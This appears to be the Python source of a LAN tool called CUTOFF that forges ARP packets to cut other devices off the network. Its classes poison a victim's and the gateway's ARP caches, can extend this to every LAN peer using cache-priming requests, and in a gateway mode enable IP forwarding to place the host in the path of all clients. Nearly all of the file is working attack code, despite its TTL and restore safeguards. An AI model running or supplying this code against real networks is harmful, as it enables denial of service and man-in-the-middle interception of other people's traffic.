"""ARP interception for hosts that are *not* the gateway.

When CUTOFF runs on a normal workstation, iptables can only filter traffic
addressed to that workstation. To cut another LAN device's internet the tool
tells that device (via a forged ARP reply) that the gateway lives at CUTOFF's
MAC, then simply does not forward. Poisoning is refreshed periodically and is
always reverted on stop, so a crash cannot leave the client black-holed for
longer than the TTL.

This is deliberately one-directional (victim only) and never enables
``ip_forward``: traffic is dropped, not inspected.
"""
from __future__ import annotations

import ipaddress
import logging
import socket
import struct
import subprocess
import threading
import time

log = logging.getLogger("cutoff.arpguard")

ETH_P_ARP = 0x0806
BROADCAST = b"\xff" * 6
MAX_PEERS = 64


def _mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))


def arp_reply(dst_mac: str, src_mac: str, sender_ip: str, sender_mac: str,
              target_ip: str, target_mac: str) -> bytes:
    eth = struct.pack("!6s6sH", _mac_bytes(dst_mac), _mac_bytes(src_mac), ETH_P_ARP)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, 2,
        _mac_bytes(sender_mac), socket.inet_aton(sender_ip),
        _mac_bytes(target_mac), socket.inet_aton(target_ip),
    )
    return eth + arp


def arp_request(dst_mac: str, src_mac: str, sender_ip: str, sender_mac: str,
                target_ip: str, target_mac: str) -> bytes:
    """ARP request used as a cache primer.

    A forged *reply* only updates an entry the target already has (Linux keeps
    ``arp_accept=0`` by default). Sending a request for the target's own
    address makes it create an entry for the spoofed sender before the first
    poison, which is what a peer that appeared after the block needs.
    """
    eth = struct.pack("!6s6sH", _mac_bytes(dst_mac), _mac_bytes(src_mac), ETH_P_ARP)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, 1,
        _mac_bytes(sender_mac), socket.inet_aton(sender_ip),
        _mac_bytes(target_mac), socket.inet_aton(target_ip),
    )
    return eth + arp


def ip_forward_enabled() -> bool:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", encoding="utf-8") as fh:
            return fh.read().strip() == "1"
    except OSError:
        return False


class ArpBlackhole:
    """Bidirectional ARP black hole.

    Two mandatory pairs cut a victim off the gateway in both directions:
      * victim  -> "gateway is at our MAC"  (kills outbound)
      * gateway -> "victim is at our MAC"   (kills inbound from the internet)

    With ``total=True`` every other known LAN peer is poisoned in both
    directions as well, so direct peer-to-peer traffic is black-holed too.
    Nothing is ever forwarded: ``ip_forward`` must be off or the MAC-level
    FORWARD drop must already be installed.
    """

    def __init__(self, iface: str, our_ip: str, our_mac: str,
                 gateway_ip: str, gateway_mac: str,
                 victim_ip: str, victim_mac: str,
                 peers: list[tuple[str, str]] | None = None,
                 total: bool = False,
                 refresh: float = 2.0, max_minutes: int = 120,
                 forward_blocked: bool = False,
                 peer_provider=None, peer_refresh: float = 10.0):
        self.iface = iface
        self.our_ip = our_ip
        self.our_mac = our_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.victim_ip = victim_ip
        self.victim_mac = victim_mac
        self.peers = self._clean_peers(peers or [])
        self.total = total
        self.refresh = max(0.5, refresh)
        self.max_seconds = max(1, max_minutes) * 60
        self.forward_blocked = forward_blocked
        self.peer_provider = peer_provider
        self.peer_refresh = max(1.0, peer_refresh)
        self._peer_lock = threading.RLock()
        self._primed: set[tuple[str, str]] = set()
        self.primed = 0
        self.pairs = self._build_pairs()
        self.started_at = 0.0
        self.sent = 0
        self._stop = threading.Event()
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self.error = ""

    @staticmethod
    def _clean_peers(peers) -> list[tuple[str, str]]:
        clean: list[tuple[str, str]] = []
        for ip, mac in peers:
            if not ip or not mac:
                continue
            clean.append((ip, mac))
        return clean[:MAX_PEERS]

    def _build_pairs(self) -> list[dict]:
        pairs = [
            {"dst_mac": self.victim_mac, "dst_ip": self.victim_ip,
             "spoof_ip": self.gateway_ip, "real_mac": self.gateway_mac},
            {"dst_mac": self.gateway_mac, "dst_ip": self.gateway_ip,
             "spoof_ip": self.victim_ip, "real_mac": self.victim_mac},
        ]
        if self.total:
            for peer_ip, peer_mac in self.peers:
                if peer_mac in (self.victim_mac, self.our_mac):
                    continue
                pairs.append({"dst_mac": peer_mac, "dst_ip": peer_ip,
                              "spoof_ip": self.victim_ip, "real_mac": self.victim_mac})
                pairs.append({"dst_mac": self.victim_mac, "dst_ip": self.victim_ip,
                              "spoof_ip": peer_ip, "real_mac": peer_mac})
        # de-duplicate by (destination, spoofed address)
        unique: dict[tuple[str, str], dict] = {}
        for pair in pairs:
            unique[(pair["dst_mac"], pair["spoof_ip"])] = pair
        return list(unique.values())

    def start(self) -> tuple[bool, str]:
        for name, value in (("target ip", self.victim_ip),
                            ("gateway ip", self.gateway_ip)):
            try:
                ipaddress.IPv4Address(value)
            except ValueError:
                return False, f"invalid {name}: {value}"
        if self.victim_mac == self.our_mac:
            return False, "refusing to intercept this host's own MAC"
        if not self.gateway_mac or not self.victim_mac:
            return False, "gateway/victim MAC is unknown"
        if ip_forward_enabled() and not self.forward_blocked:
            return False, (
                "ip_forward is enabled and no FORWARD drop was installed; "
                "interception would turn this host into a router/MITM instead of a block"
            )
        try:
            self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(ETH_P_ARP))
            self._sock.bind((self.iface, ETH_P_ARP))
        except (PermissionError, OSError) as exc:
            self.error = f"raw socket unavailable: {exc}"
            return False, self.error
        self.started_at = time.time()
        self._send_all(poison=True)
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name=f"arp-blackhole-{self.victim_ip}")
        self._thread.start()
        return True, (f"black-holing {self.victim_ip} "
                      f"({len(self.pairs)} ARP pairs, total={self.total})")

    def _prime(self, pair: dict) -> None:
        """Make the destination create a cache entry for the spoofed sender.

        Reply-only poisoning silently no-ops on a host that has no entry for
        the claimed address yet (Linux ``arp_accept=0``), which is exactly the
        case for a peer that joined after the block started.
        """
        if not self._sock:
            return
        key = (pair["dst_mac"], pair["spoof_ip"])
        if key in self._primed:
            return
        frame = arp_request(
            dst_mac=pair["dst_mac"], src_mac=self.our_mac,
            sender_ip=pair["spoof_ip"], sender_mac=self.our_mac,
            target_ip=pair["dst_ip"], target_mac=pair["dst_mac"],
        )
        try:
            self._sock.send(frame)
            self.primed += 1
            self._primed.add(key)
        except OSError as exc:
            self.error = str(exc)

    def _send_pair(self, pair: dict, poison: bool) -> None:
        if not self._sock:
            return
        sender_mac = self.our_mac if poison else pair["real_mac"]
        frame = arp_reply(
            dst_mac=pair["dst_mac"],
            src_mac=self.our_mac,
            sender_ip=pair["spoof_ip"],
            sender_mac=sender_mac,
            target_ip=pair["dst_ip"],
            target_mac=pair["dst_mac"],
        )
        try:
            self._sock.send(frame)
            self.sent += 1
        except OSError as exc:
            self.error = str(exc)

    def _send_all(self, poison: bool = True) -> None:
        with self._peer_lock:
            pairs = list(self.pairs)
        for pair in pairs:
            if poison:
                self._prime(pair)
            self._send_pair(pair, poison)

    def set_peers(self, peers: list[tuple[str, str]]) -> list[dict]:
        """Replace the peer set and return the pairs that are new.

        Called from the refresh loop, so it must be safe while the sender
        thread iterates ``self.pairs``.
        """
        cleaned = self._clean_peers(peers)
        with self._peer_lock:
            if cleaned == self.peers:
                return []
            self.peers = cleaned
            self.pairs = self._build_pairs()
            fresh = [p for p in self.pairs
                     if (p["dst_mac"], p["spoof_ip"]) not in self._primed]
        return fresh

    def _refresh_peers(self) -> None:
        if not self.peer_provider:
            return
        try:
            peers = self.peer_provider()
        except Exception:  # noqa: BLE001 - a bad probe must not kill the block
            log.exception("ARP peer provider failed")
            return
        fresh = self.set_peers(list(peers or []))
        if fresh:
            log.info("ARP peer list refreshed: %d peer(s), %d new pair(s)",
                     len(self.peers), len(fresh))

    def _restore(self) -> None:
        for _ in range(3):
            self._send_all(poison=False)
            time.sleep(0.15)

    def _loop(self) -> None:
        last_peer = time.time()
        while not self._stop.wait(self.refresh):
            if time.time() - self.started_at > self.max_seconds:
                log.warning("black-hole TTL expired for %s", self.victim_ip)
                self._restore()
                self._stop.set()
                break
            if time.time() - last_peer >= self.peer_refresh:
                last_peer = time.time()
                self._refresh_peers()
            self._send_all(poison=True)

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._restore()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None

    def status(self) -> dict:
        return {
            "target_ip": self.victim_ip,
            "target_mac": self.victim_mac,
            "total": self.total,
            "pairs": len(self.pairs),
            "peers": len(self.peers) if self.total else 0,
            "active": bool(self._thread and self._thread.is_alive()),
            "sent": self.sent,
            "primed": self.primed,
            "age_s": int(time.time() - self.started_at) if self.started_at else 0,
            "ttl_s": self.max_seconds,
            "error": self.error,
        }



class LanGateway:
    """Put this host in-path for the whole LAN (bettercap-style ARP spoof).

    Every client is told the gateway lives at our MAC, and the gateway is told
    every client lives at our MAC. IPv4 forwarding is enabled so normal traffic
    keeps flowing; blocked devices are dropped in the FORWARD chain. The old
    ``ip_forward`` value is restored on stop.
    """

    def __init__(self, iface: str, our_ip: str, our_mac: str,
                 gateway_ip: str, gateway_mac: str,
                 clients: list[tuple[str, str]],
                 refresh: float = 2.0, max_minutes: int = 60):
        self.iface = iface
        self.our_ip = our_ip
        self.our_mac = our_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.clients = [(ip, mac) for ip, mac in clients
                        if ip and mac and ip != our_ip and mac != our_mac][:128]
        self.refresh = max(0.5, refresh)
        self.max_seconds = max(1, max_minutes) * 60
        self.pairs = self._build_pairs()
        self.old_forward: str | None = None
        self.started_at = 0.0
        self.sent = 0
        self._stop = threading.Event()
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self.error = ""

    def _build_pairs(self) -> list[dict]:
        pairs: list[dict] = []
        for ip, mac in self.clients:
            pairs.append({"dst_mac": mac, "dst_ip": ip,
                          "spoof_ip": self.gateway_ip, "real_mac": self.gateway_mac})
            pairs.append({"dst_mac": self.gateway_mac, "dst_ip": self.gateway_ip,
                          "spoof_ip": ip, "real_mac": mac})
        return pairs

    def _forward_policy(self) -> str:
        try:
            cp = subprocess.run(["iptables", "-w", "5", "-S", "FORWARD"],
                                capture_output=True, text=True, timeout=10)
            first = (cp.stdout or "").splitlines()
            if first and first[0].startswith("-P FORWARD"):
                return first[0].split()[-1]
        except (OSError, subprocess.SubprocessError):
            pass
        return "ACCEPT"

    def _read_forward(self) -> str:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", encoding="utf-8") as fh:
                return fh.read().strip()
        except OSError:
            return "0"

    def _set_forward(self, value: str) -> bool:
        try:
            cp = subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"],
                                capture_output=True, text=True, timeout=10)
            return cp.returncode == 0
        except (OSError, subprocess.SubprocessError):
            return False

    def start(self) -> tuple[bool, str]:
        if not self.gateway_ip or not self.gateway_mac:
            return False, "gateway IP/MAC unknown"
        if not self.clients:
            return False, "no active clients to put in-path"
        if self._forward_policy() == "DROP":
            return False, ("FORWARD policy is DROP; gateway mode would cut all traffic. "
                           "Set the policy to ACCEPT or use router-level blocking.")
        try:
            self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(ETH_P_ARP))
            self._sock.bind((self.iface, ETH_P_ARP))
        except (PermissionError, OSError) as exc:
            return False, f"raw socket unavailable: {exc}"
        self.old_forward = self._read_forward()
        if self.old_forward != "1" and not self._set_forward("1"):
            self._sock.close()
            self._sock = None
            return False, "cannot enable IPv4 forwarding (root required)"
        self.started_at = time.time()
        self._send_all(poison=True)
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name="cutoff-lan-gateway")
        self._thread.start()
        return True, f"in-path for {len(self.clients)} clients ({len(self.pairs)} ARP pairs)"

    def _send_pair(self, pair: dict, poison: bool) -> None:
        if not self._sock:
            return
        sender_mac = self.our_mac if poison else pair["real_mac"]
        frame = arp_reply(
            dst_mac=pair["dst_mac"], src_mac=self.our_mac,
            sender_ip=pair["spoof_ip"], sender_mac=sender_mac,
            target_ip=pair["dst_ip"], target_mac=pair["dst_mac"],
        )
        try:
            self._sock.send(frame)
            self.sent += 1
        except OSError as exc:
            self.error = str(exc)

    def _send_all(self, poison: bool = True) -> None:
        for pair in self.pairs:
            self._send_pair(pair, poison)

    def _restore(self) -> None:
        for _ in range(3):
            self._send_all(poison=False)
            time.sleep(0.15)

    def _loop(self) -> None:
        while not self._stop.wait(self.refresh):
            if time.time() - self.started_at > self.max_seconds:
                log.warning("gateway mode TTL expired")
                self._restore()
                if self.old_forward is not None and self.old_forward != "1":
                    self._set_forward(self.old_forward)
                self._stop.set()
                break
            self._send_all(poison=True)

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._restore()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None
        if self.old_forward is not None and self.old_forward != "1":
            self._set_forward(self.old_forward)
        self.old_forward = None

    def status(self) -> dict:
        return {
            "active": bool(self._thread and self._thread.is_alive()),
            "clients": len(self.clients),
            "pairs": len(self.pairs),
            "sent": self.sent,
            "age_s": int(time.time() - self.started_at) if self.started_at else 0,
            "ttl_s": self.max_seconds,
            "ip_forward": self._read_forward(),
            "forward_policy": self._forward_policy(),
            "error": self.error,
        }


class ArpInterceptor:
    def __init__(self, iface: str, our_ip: str, our_mac: str,
                 gateway_ip: str, gateway_mac: str,
                 target_ip: str, target_mac: str,
                 refresh: float = 2.0, max_minutes: int = 120,
                 forward_blocked: bool = False):
        self.iface = iface
        self.our_ip = our_ip
        self.our_mac = our_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.refresh = max(0.5, refresh)
        self.max_seconds = max(1, max_minutes) * 60
        self.forward_blocked = forward_blocked
        self.started_at = 0.0
        self.sent = 0
        self._stop = threading.Event()
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self.error = ""

    # ------------------------------------------------------------------
    def start(self) -> tuple[bool, str]:
        for name, value in (("target ip", self.target_ip), ("gateway ip", self.gateway_ip)):
            try:
                ipaddress.IPv4Address(value)
            except ValueError:
                return False, f"invalid {name}: {value}"
        if self.target_mac == self.our_mac:
            return False, "refusing to intercept this host's own MAC"
        if ip_forward_enabled() and not self.forward_blocked:
            return False, (
                "ip_forward is enabled and no FORWARD drop was installed; "
                "interception would turn this host into a router/MITM instead of a block"
            )
        try:
            self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(ETH_P_ARP))
            self._sock.bind((self.iface, ETH_P_ARP))
        except (PermissionError, OSError) as exc:
            self.error = f"raw socket unavailable: {exc}"
            return False, self.error
        self.started_at = time.time()
        self._poison_once()
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name=f"arpguard-{self.target_ip}")
        self._thread.start()
        return True, f"intercepting {self.target_ip} via ARP"

    def _poison_once(self) -> None:
        if not self._sock:
            return
        frame = arp_reply(
            dst_mac=self.target_mac,
            src_mac=self.our_mac,
            sender_ip=self.gateway_ip,
            sender_mac=self.our_mac,
            target_ip=self.target_ip,
            target_mac=self.target_mac,
        )
        try:
            self._sock.send(frame)
            self.sent += 1
        except OSError as exc:
            self.error = str(exc)

    def _restore(self, times: int = 5) -> None:
        if not self._sock:
            return
        frame = arp_reply(
            dst_mac=self.target_mac,
            src_mac=self.gateway_mac,
            sender_ip=self.gateway_ip,
            sender_mac=self.gateway_mac,
            target_ip=self.target_ip,
            target_mac=self.target_mac,
        )
        for _ in range(times):
            try:
                self._sock.send(frame)
                time.sleep(0.15)
            except OSError:
                break

    def _loop(self) -> None:
        while not self._stop.wait(self.refresh):
            if time.time() - self.started_at > self.max_seconds:
                log.warning("interception TTL expired for %s", self.target_ip)
                self._restore()
                self._stop.set()
                break
            self._poison_once()

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._restore()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None

    def status(self) -> dict:
        return {
            "target_ip": self.target_ip,
            "target_mac": self.target_mac,
            "active": bool(self._thread and self._thread.is_alive()),
            "sent": self.sent,
            "age_s": int(time.time() - self.started_at) if self.started_at else 0,
            "ttl_s": self.max_seconds,
            "error": self.error,
        }
